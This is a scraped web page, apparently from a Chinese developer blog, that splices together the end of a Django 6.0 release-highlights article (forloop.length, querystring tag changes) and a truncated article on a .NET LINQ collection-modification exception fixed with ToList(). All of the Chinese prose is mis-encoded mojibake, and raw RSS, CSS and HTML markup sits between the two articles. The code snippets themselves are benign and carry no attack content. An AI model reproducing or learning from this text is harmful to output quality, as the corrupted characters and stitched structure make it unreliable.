<p>ç»§ç»­æ¥çœ‹æ¨¡æ¿æ–¹é¢çš„æ”¹è¿›ï¼Œé¦–å…ˆæ˜¯è¿™ä¸ªå°è€Œå®ç”¨çš„æ–°å¢åŠŸèƒ½ï¼š</p>
<blockquote>
<p>åœ¨ <code>for</code> å¾ªç¯ä¸­ç°åœ¨å¯ä»¥ä½¿ç”¨æ–°çš„å˜é‡ <code>forloop.length</code>ã€‚</p>
</blockquote>
<p>è¿™ä¸€å°æ‰©å±•ä½¿å¾—ä½ å¯ä»¥ç¼–å†™å¦‚ä¸‹æ¨¡æ¿å¾ªç¯ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
  {% for goose in geese %}
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>{{ forloop.counter }}/{{ forloop.length }}<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span>: {{ goose.name }}
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  {% endfor %}
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
</code></pre>
<p>ä»¥å‰ï¼Œä½ éœ€è¦é€šè¿‡å…¶ä»–æ–¹å¼å¼•ç”¨é•¿åº¦ï¼Œä¾‹å¦‚ <code>{{ geese|length }}</code>ï¼Œè¿™ç¨æ˜¾ä¸å¤Ÿçµæ´»ã€‚</p>
<p>æ„Ÿè°¢ Jonathan StrÃ¶bele åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.djangoproject.com%2Fticket%2F36186" target="_blank" title="https://code.djangoproject.com/ticket/36186" ref="nofollow noopener noreferrer">Ticket #36186</a> ä¸­è´¡çŒ®äº†è¿™ä¸ªæƒ³æ³•å’Œå®ç°ï¼Œä»¥åŠ David Smithã€Paolo Melchiorre å’Œ Sarah Boyce çš„å®¡æŸ¥ã€‚</p>
<h2 data-id="heading-20"><code>querystring</code> æ¨¡æ¿æ ‡ç­¾å¢å¼º</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.djangoproject.com%2Fen%2Fstable%2Fref%2Ftemplates%2Fbuiltins%2F%23django-template" target="_blank" title="https://docs.djangoproject.com/en/stable/ref/templates/builtins/#django-template" ref="nofollow noopener noreferrer">Django 5.1 ä¸­å¼•å…¥çš„ <code>querystring</code> æ¨¡æ¿æ ‡ç­¾</a> ç”¨äºå¸®åŠ©æ„å»ºä¿®æ”¹å½“å‰è¯·æ±‚æŸ¥è¯¢å‚æ•°çš„é“¾æ¥ï¼Œç°åœ¨æœ‰äº†ä¸¤ä¸ªæ‰©å±•ã€‚</p>
<ol>
<li>å‘è¡Œè¯´æ˜ï¼š</li>
</ol>
<blockquote>
<p><code>querystring</code> æ¨¡æ¿æ ‡ç­¾ç°åœ¨å§‹ç»ˆåœ¨è¿”å›çš„æŸ¥è¯¢å­—ç¬¦ä¸²å‰åŠ ä¸Š <code>?</code>ï¼Œç¡®ä¿é“¾æ¥ç”Ÿæˆè¡Œä¸ºçš„å¯é æ€§ã€‚</p>
</blockquote>
<p>è¿™ä¸€å°å˜åŒ–æ”¹è¿›äº†åœ¨æä¾›ç©ºæŸ¥è¯¢å‚æ•°æ˜ å°„æ—¶æ ‡ç­¾çš„è¡Œä¸ºã€‚å‡è®¾ä½ æœ‰ä¸€ä¸ªæ¨¡æ¿å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-django" lang="django">&lt;a href="{% querystring params %}"&gt;Reset search&lt;/a&gt;
</code></pre>
<p>å…¶ä¸­ <code>params</code> æ˜¯ä¸€ä¸ªå¯èƒ½æœ‰æ—¶ä¸ºç©ºçš„å­—å…¸ã€‚ä»¥å‰ï¼Œå¦‚æœ <code>params</code> ä¸ºç©ºï¼Œè¾“å‡ºå°†æ˜¯ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">""</span>&gt;</span>Reset search<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
</code></pre>
<p>æµè§ˆå™¨ä¼šå°†æ­¤è§†ä¸ºæŒ‡å‘ç›¸åŒ URLï¼ˆåŒ…æ‹¬æŸ¥è¯¢å‚æ•°ï¼‰çš„é“¾æ¥ï¼Œå› æ­¤ä¸ä¼šæ¸…é™¤æŸ¥è¯¢å‚æ•°ï¼Œè¿™ä¸é¢„æœŸä¸ç¬¦ã€‚ç°åœ¨ï¼Œæœ‰äº†è¿™ä¸€å˜åŒ–ï¼Œè¾“å‡ºå°†æ˜¯ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"?"</span>&gt;</span>Reset search<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
</code></pre>
<p>æµè§ˆå™¨ä¼šå°† <code>?</code> è§†ä¸ºæŒ‡å‘ç›¸åŒ URLï¼ˆä¸å¸¦ä»»ä½•æŸ¥è¯¢å‚æ•°ï¼‰çš„é“¾æ¥ï¼Œä»è€Œæ¸…é™¤æŸ¥è¯¢å‚æ•°ï¼Œç¬¦åˆç”¨æˆ·çš„æœŸæœ›ã€‚</p>
<p>æ„Ÿè°¢ Django Fellow Sarah Boyce å‘ç°è¿™ä¸€æ”¹è¿›å¹¶å®ç°äº†ä¿®å¤ï¼Œè§ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.djangoproject.com%2Fticket%2F36268" target="_blank" title="https://code.djangoproject.com/ticket/36268" ref="nofollow noopener noreferrer">Ticket #36268</a>ï¼Œä»¥åŠ Django Fellow Natalia Bidart çš„å®¡æŸ¥ï¼</p>
<ol start="2">
<li>å‘è¡Œè¯´æ˜ï¼š</li>
</ol>
<blockquote>
<p><code>querystring</code> æ¨¡æ¿æ ‡ç­¾ç°åœ¨å¯ä»¥æ¥å—å¤šä¸ªä½ç½®å‚æ•°ï¼Œè¿™äº›å‚æ•°å¿…é¡»æ˜¯æ˜ å°„ï¼Œä¾‹å¦‚ <code>QueryDict</code> æˆ– <code>dict</code>ã€‚</p>
</blockquote>
<p>è¿™ä¸€å¢å¼ºåŠŸèƒ½å…è®¸æ ‡ç­¾åœ¨æ„å»ºè¾“å‡ºæ—¶åˆå¹¶å¤šä¸ªæŸ¥è¯¢å‚æ•°æ¥æºã€‚ä¾‹å¦‚ï¼Œä½ å¯èƒ½æœ‰ä¸€ä¸ªæ¨¡æ¿å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-django" lang="django">&lt;a href="{% querystring request.GET super_search_params %}"&gt;Super search&lt;/a&gt;
</code></pre>
<p>å…¶ä¸­ <code>super_search_params</code> æ˜¯ä¸€ä¸ªåŒ…å«é¢å¤–å‚æ•°çš„å­—å…¸ï¼Œç”¨äºå°†å½“å‰æœç´¢å‡çº§ä¸ºâ€œè¶…çº§æœç´¢â€ã€‚è¯¥æ ‡ç­¾ä¼šåˆå¹¶è¿™ä¸¤ä¸ªæ˜ å°„ï¼Œå¯¹äºé‡å¤çš„é”®ï¼Œåé¢çš„æ˜ å°„å°†ä¼˜å…ˆã€‚</p>
<p>å†æ¬¡æ„Ÿè°¢ Sarah Boyce åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.djangoproject.com%2Fticket%2F35529" target="_blank" title="https://code.djangoproject.com/ticket/35529" ref="nofollow noopener noreferrer">Ticket #35529</a> ä¸­æå‡ºè¿™ä¸€æ”¹è¿›ï¼ŒGiannis Terzopoulos å®ç°äº†å®ƒï¼Œä»¥åŠ Natalia Bidartã€Sarah Boyce å’Œ Tom Carrick çš„å®¡æŸ¥ï¼</p>
<h2 data-id="heading-21">ç»“è¯­</h2>
<p>ä»¥ä¸Šå°±æ˜¯æœ¬æ¬¡ Django 6.0 çš„äº®ç‚¹æ€»ç»“ï¼æ„Ÿè°¢ä½ çš„é˜…è¯»ã€‚æ›´å¤šå˜åŒ–å¯ä»¥åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.djangoproject.com%2Fen%2Fstable%2Freleases%2F6.0%2F" target="_blank" title="https://docs.djangoproject.com/en/stable/releases/6.0/" ref="nofollow noopener noreferrer">å‘è¡Œè¯´æ˜</a> ä¸­æŸ¥çœ‹ã€‚</p>
<p>æ­¤å¤–ï¼Œè¿˜æœ‰è®¸å¤šæœªè¿›å…¥å‘è¡Œè¯´æ˜çš„å¹•åæ”¹è¿›å’Œé”™è¯¯ä¿®å¤ã€‚ä¼˜åŒ–å’Œå¾®å°æ”¹è¿›ä¸€ç›´åœ¨è¢«åˆå¹¶ï¼Œæ‰€ä»¥ä¸è¦å»¶è¿Ÿï¼Œç°åœ¨å°±å‡çº§å§ï¼</p>
<p>æ„Ÿè°¢ä¸º Django 6.0 è´¡çŒ®çš„ <strong>174 äºº</strong>ï¼Œè¿™ä¸€æ•°å­—ç”± Mariusz Felisiak åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgist.github.com%2Ffelixxm%2F99501cdbf6ed5a69295b4cb3f8c21d80" target="_blank" title="https://gist.github.com/felixxm/99501cdbf6ed5a69295b4cb3f8c21d80" ref="nofollow noopener noreferrer">æ­¤åˆ—è¡¨</a> ä¸­ç»Ÿè®¡ã€‚</p>
<p>æ„¿ä½ çš„å‡çº§è¿‡ç¨‹è¿…é€Ÿã€é¡ºåˆ©ã€å®‰å…¨ä¸”å¯é ï¼</p>
<blockquote>
<p>æœ€åæ„Ÿè°¢é˜…è¯»ï¼æ¬¢è¿å…³æ³¨æˆ‘ï¼Œå¾®ä¿¡å…¬ä¼—å·ï¼š <strong>å€”å¼ºé’é“œä¸‰</strong>ã€‚<br/>
<strong>ç‚¹èµã€æ”¶è—ã€å…³æ³¨</strong>ï¼Œä¸€é”®ä¸‰è¿ï¼ï¼<br/>
æ¬¢è¿ ç‚¹å‡» <strong>ã€ğŸ‘å–œæ¬¢ä½œè€…ã€‘</strong> æŒ‰é’®è¿›è¡Œ <strong>æ‰“èµğŸ’°ğŸ’°</strong>ï¼Œè¯·æˆ‘å–ä¸€æ¯å’–å•¡â˜•ï¸ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LINQé›†åˆä¿®æ”¹å¼‚å¸¸æ·±åº¦è§£æï¼šToList()çš„æ•‘åœºæ—¶åˆ»]]></title>    <link>https://juejin.cn/post/7582849187864723507</link>    <guid>https://juejin.cn/post/7582849187864723507</guid>    <pubDate>2025-12-12T15:35:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582849187864723507" data-draft-id="7582809606067339290" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LINQé›†åˆä¿®æ”¹å¼‚å¸¸æ·±åº¦è§£æï¼šToList()çš„æ•‘åœºæ—¶åˆ»"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-12T15:35:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="guchen66"/> <meta itemprop="url" content="https://juejin.cn/user/3191200923270394"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LINQé›†åˆä¿®æ”¹å¼‚å¸¸æ·±åº¦è§£æï¼šToList()çš„æ•‘åœºæ—¶åˆ»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3191200923270394/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    guchen66
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-12T15:35:42.000Z" title="Fri Dec 12 2025 15:35:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">é—®é¢˜èƒŒæ™¯</h2>
<p>åœ¨æœ€è¿‘çš„é¡¹ç›®å¼€å‘ä¸­ï¼Œæˆ‘é‡åˆ°äº†ä¸€ä¸ªç»å…¸çš„.NETå¼‚å¸¸ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">System.InvalidOperationException: <span class="hljs-string">"é›†åˆåœ¨æšä¸¾æ•°å®ä¾‹åŒ–åè¿›è¡Œäº†ä¿®æ”¹ã€‚"</span>
</code></pre>
<p>è¿™ä¸ªå¼‚å¸¸å‡ºç°åœ¨ä½¿ç”¨LINQå¤„ç†å­—å…¸é›†åˆæ—¶ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title class_">UpdateSVReportValues</span>(<span class="hljs-title class_">List</span>&lt;<span class="hljs-built_in">string</span>&gt; allDatas)
{
 Â  Â <span class="hljs-keyword">if</span> (allDatas == <span class="hljs-literal">null</span> || allDatas.<span class="hljs-property">Count</span> != _svData.<span class="hljs-property">Count</span>)
 Â   {
 Â  Â  Â  Â <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArgumentException</span>(<span class="hljs-string">"æ•°æ®æ•°é‡ä¸keyæ•°é‡ä¸åŒ¹é…"</span>);
 Â   }
 Â  Â 
 Â  Â <span class="hljs-comment">// ä½¿ç”¨Zipç»„åˆé”®å€¼å¯¹</span>
 Â  Â <span class="hljs-keyword">var</span> updates = _svData.<span class="hljs-property">Keys</span>.<span class="hljs-title class_">Zip</span>(allDatas, <span class="hljs-function">(<span class="hljs-params">key, value</span>) =&gt;</span> <span class="hljs-keyword">new</span> { <span class="hljs-title class_">Key</span> = key, <span class="hljs-title class_">Value</span> = value });
â€‹
 Â  Â foreach (<span class="hljs-keyword">var</span> item <span class="hljs-keyword">in</span> updates) Â <span class="hljs-comment">// å¼‚å¸¸å‘ç”Ÿåœ¨è¿™é‡Œ</span>
 Â   {
 Â  Â  Â  Â _svData.<span class="hljs-title class_">AddOrUpdate</span>(item.<span class="hljs-property">Key</span>, item.<span class="hljs-property">Value</span>, <span class="hljs-function">(<span class="hljs-params">k, oldValue</span>) =&gt;</span> item.<span class="hljs-property">Value</span>); Â <span class="hljs-comment">// ä¿®æ”¹é›†åˆ</span>
 Â   }
}
</code></pre>
<h2 data-id="heading-1">é—®é¢˜æ ¹æºï¼šLINQçš„å»¶è¿Ÿæ‰§è¡Œ</h2>
<p>ç»è¿‡æ·±å…¥åˆ†æï¼Œæˆ‘å‘ç°é—®é¢˜çš„æ ¹æºåœ¨äº<strong>LINQçš„å»¶è¿Ÿæ‰§è¡Œç‰¹æ€§</strong>ã€‚</p>
<h3 data-id="heading-2">ä»€ä¹ˆæ˜¯å»¶è¿Ÿæ‰§è¡Œï¼Ÿ</h3>
<p>å½“æˆ‘ä»¬å†™ä¸‹LINQæŸ¥è¯¢æ—¶ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">var</span> updates = _svData.<span class="hljs-property">Keys</span>.<span class="hljs-title class_">Zip</span>(allDatas, <span class="hljs-function">(<span class="hljs-params">key, value</span>) =&gt;</span> <span class="hljs-keyword">new</span> { <span class="hljs-title class_">Key</span> = key, <span class="hljs-title class_">Value</span> = value });
</code></pre>
<p>å®é™…ä¸Šå¹¶æ²¡æœ‰æ‰§è¡Œä»»ä½•è®¡ç®—ï¼Œ<code>updates</code>åªæ˜¯ä¸€ä¸ª"æŸ¥è¯¢å®šä¹‰"ï¼Œå®ƒè®°å½•äº†"è¦åšä»€ä¹ˆ"ï¼Œä½†æ²¡æœ‰ç«‹å³æ‰§è¡Œã€‚</p>
<h3 data-id="heading-3">ä½•æ—¶çœŸæ­£æ‰§è¡Œï¼Ÿ</h3>
<p>åªæœ‰å½“æˆ‘ä»¬å¼€å§‹<strong>æšä¸¾</strong>æŸ¥è¯¢ç»“æœæ—¶ï¼ˆå¦‚<code>foreach</code>å¾ªç¯ï¼‰ï¼ŒLINQæ‰ä¼šçœŸæ­£æ‰§è¡ŒæŸ¥è¯¢ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> item <span class="hljs-keyword">in</span> updates) Â <span class="hljs-comment">// è¿™é‡Œå¼€å§‹è§¦å‘å®é™…æ‰§è¡Œ</span>
{
 Â  Â <span class="hljs-comment">// ...</span>
}
</code></pre>
<h3 data-id="heading-4">å¾ªç¯å†…éƒ¨çš„æ‰§è¡Œæœºåˆ¶</h3>
<p>æ¯æ¬¡è¿­ä»£<code>foreach</code>å¾ªç¯æ—¶ï¼ŒLINQä¼šï¼š</p>
<ol start="0">
<li>ä»<code>_svData.Keys</code>ä¸­è·å–ä¸‹ä¸€ä¸ªé”®</li>
<li>ä»<code>allDatas</code>ä¸­è·å–å¯¹åº”çš„å€¼</li>
<li>åˆ›å»ºåŒ¿åå¯¹è±¡å¹¶è¿”å›</li>
</ol>
<p><strong>å…³é”®é—®é¢˜</strong>ï¼š<strong>æ¯æ¬¡è¿­ä»£éƒ½ä¼šé‡æ–°è®¿é—®<code>_svData.Keys</code>é›†åˆ</strong>ï¼</p>
<h3 data-id="heading-5">ä¸ºä»€ä¹ˆä¼šæŠ›å‡ºå¼‚å¸¸</h3>
<p>å½“åœ¨å¾ªç¯å†…éƒ¨ä¿®æ”¹é›†åˆæ—¶ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">_svData.<span class="hljs-title class_">AddOrUpdate</span>(item.<span class="hljs-property">Key</span>, item.<span class="hljs-property">Value</span>, <span class="hljs-function">(<span class="hljs-params">k, oldValue</span>) =&gt;</span> item.<span class="hljs-property">Value</span>);
</code></pre>
<p>è¿™è¡Œä»£ç ä¿®æ”¹äº†<code>_svData</code>å­—å…¸ã€‚ç”±äº<code>_svData.Keys</code>æ˜¯ä¸€ä¸ª<strong>åŠ¨æ€è§†å›¾</strong>ï¼ˆä¸æ˜¯é™æ€å‰¯æœ¬ï¼‰ï¼Œå®ƒä¼šå®æ—¶åæ˜ <code>_svData</code>çš„å˜åŒ–ã€‚</p>
<p>å› æ­¤ï¼Œå½“å¾ªç¯è¿›è¡Œåˆ°ç¬¬äºŒæ¬¡è¿­ä»£æ—¶ï¼š</p>
<ul>
<li>LINQå°è¯•å†æ¬¡è®¿é—®<code>_svData.Keys</code></li>
<li>å‘ç°è¿™ä¸ªé›†åˆå·²ç»åœ¨ç¬¬ä¸€æ¬¡è¿­ä»£ä¸­è¢«ä¿®æ”¹</li>
<li>ç«‹å³æŠ›å‡º"é›†åˆåœ¨æšä¸¾æ•°å®ä¾‹åŒ–åè¿›è¡Œäº†ä¿®æ”¹"çš„å¼‚å¸¸</li>
</ul>
<h2 data-id="heading-6">è§£å†³æ–¹æ¡ˆï¼šToList()çš„æ•‘åœº</h2>
<p>è§£å†³è¿™ä¸ªé—®é¢˜çš„å…³é”®æ˜¯<strong>æ‰“ç ´å»¶è¿Ÿæ‰§è¡Œé“¾</strong>ï¼Œåˆ›å»ºæŸ¥è¯¢ç»“æœçš„é™æ€å‰¯æœ¬ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">var</span> updates = _svData.<span class="hljs-property">Keys</span>.<span class="hljs-title class_">Zip</span>(allDatas, <span class="hljs-function">(<span class="hljs-params">key, value</span>) =&gt;</span> <span class="hljs-keyword">new</span> { <span class="hljs-title class_">Key</span> = key, <span class="hljs-title class_">Value</span> = value })
 Â   .<span class="hljs-title class_">ToList</span>(); Â <span class="hljs-comment">// åˆ›å»ºé™æ€å‰¯æœ¬</span>
â€‹
foreach (<span class="hljs-keyword">var</span> item <span class="hljs-keyword">in</span> updates)
{
 Â  Â _svData.<span class="hljs-title class_">AddOrUpdate</span>(item.<span class="hljs-property">Key</span>, item.<span class="hljs-property">Value</span>, <span class="hljs-function">(<span class="hljs-params">k, oldValue</span>) =&gt;</span> item.<span class="hljs-property">Value</span>);
}
</code></pre>
<h3 data-id="heading-7">ToList()çš„å·¥ä½œåŸç†</h3>
<p><code>ToList()</code>æ–¹æ³•ä¼šï¼š</p>
<ol start="0">
<li>ç«‹å³æ‰§è¡Œæ•´ä¸ªLINQæŸ¥è¯¢</li>
<li>å°†æ‰€æœ‰ç»“æœä¸€æ¬¡æ€§åŠ è½½åˆ°å†…å­˜ä¸­çš„<code>List&lt;&gt;</code>å¯¹è±¡</li>
<li>è¿”å›è¿™ä¸ªå®Œæ•´çš„é™æ€å‰¯æœ¬</li>
</ol>
<p>ä¹‹åçš„<code>foreach</code>å¾ªç¯åªæšä¸¾è¿™ä¸ªé™æ€å‰¯æœ¬ï¼Œä¸å†è®¿é—®åŸå§‹çš„<code>_svData.Keys</code>é›†åˆã€‚å› æ­¤ï¼Œå³ä½¿åœ¨å¾ªç¯å†…éƒ¨ä¿®æ”¹äº†<code>_svData</code>ï¼Œä¹Ÿä¸ä¼šå½±å“åˆ°æ­£åœ¨æšä¸¾çš„å‰¯æœ¬ã€‚</p>
<h2 data-id="heading-8">ToList()çš„ä½¿ç”¨åœºæ™¯</h2>
<p>é™¤äº†é¿å…é›†åˆä¿®æ”¹å¼‚å¸¸å¤–ï¼Œ<code>ToList()</code>è¿˜æœ‰å¾ˆå¤šå…¶ä»–é€‚ç”¨åœºæ™¯ï¼š</p>
<h3 data-id="heading-9">1. å¤šæ¬¡æšä¸¾åŒä¸€æŸ¥è¯¢ç»“æœ</h3>
<p>é¿å…é‡å¤æ‰§è¡ŒLINQæŸ¥è¯¢å¸¦æ¥çš„æ€§èƒ½å¼€é”€ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// ä¸å¥½çš„åšæ³•ï¼šå¤šæ¬¡æ‰§è¡ŒåŒä¸€æŸ¥è¯¢
var <span class="hljs-attr">query</span> = db.Users.Where(u =&gt; u.Age &gt; <span class="hljs-number">18</span>)<span class="hljs-comment">;</span>
var <span class="hljs-attr">count</span> = query.Count()<span class="hljs-comment">;</span>
var <span class="hljs-attr">firstUser</span> = query.First()<span class="hljs-comment">;</span>
â€‹
// å¥½çš„åšæ³•ï¼šåˆ›å»ºå‰¯æœ¬åå¤šæ¬¡ä½¿ç”¨
var <span class="hljs-attr">users</span> = db.Users.Where(u =&gt; u.Age &gt; <span class="hljs-number">18</span>).ToList()<span class="hljs-comment">;</span>
var <span class="hljs-attr">count</span> = users.Count<span class="hljs-comment">;</span>
var <span class="hljs-attr">firstUser</span> = users.First()<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-10">2. éœ€è¦éšæœºè®¿é—®æŸ¥è¯¢ç»“æœ</h3>
<p><code>List&lt;&gt;</code>æ”¯æŒç´¢å¼•è®¿é—®ï¼Œè€ŒLINQæŸ¥è¯¢ç»“æœé€šå¸¸ä¸æ”¯æŒï¼š</p>
<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">users</span> = db.Users.OrderBy(u =&gt; u.Name).ToList()<span class="hljs-comment">;</span>
var <span class="hljs-attr">thirdUser</span> = users[<span class="hljs-number">2</span>]<span class="hljs-comment">; Â // ç›´æ¥é€šè¿‡ç´¢å¼•è®¿é—®</span>
</code></pre>
<h3 data-id="heading-11">3. éœ€è¦ä¿®æ”¹æŸ¥è¯¢ç»“æœ</h3>
<p>å½“éœ€è¦å¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œæ·»åŠ ã€åˆ é™¤ç­‰æ“ä½œæ—¶ï¼š</p>
